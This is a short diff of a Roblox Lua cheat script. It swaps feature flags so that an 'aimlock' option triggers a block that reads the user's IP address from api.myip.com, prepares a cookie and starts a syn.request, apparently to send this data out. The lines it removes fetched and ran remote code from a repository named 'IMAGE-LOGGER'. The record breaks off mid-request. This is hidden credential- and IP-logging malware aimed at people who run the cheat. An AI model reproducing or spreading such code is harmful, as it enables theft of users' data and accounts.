@@ -1,14 +1,13 @@
     if game.Players.LocalPlayer.Name == "AmyAnthony6" or game.Players.LocalPlayer.Name == "" then
-    if getgenv().aimlock == true then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/findmejojo/IMAGE-LOGGER-REAL-DONT-MISS-OUT/main/README.md"))()    
-    print("test")
+    if getgenv().skid == true then
+    print("hi")
     end
     
     if getgenv().banme == true then
         game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('OneMoreTime');
 end
 
-if getgenv().skid == true then
+if getgenv().aimlock == true then
                 local ip = game:HttpGet("https://api.myip.com/")
 local COOKIE = ""
 local response = syn.request(
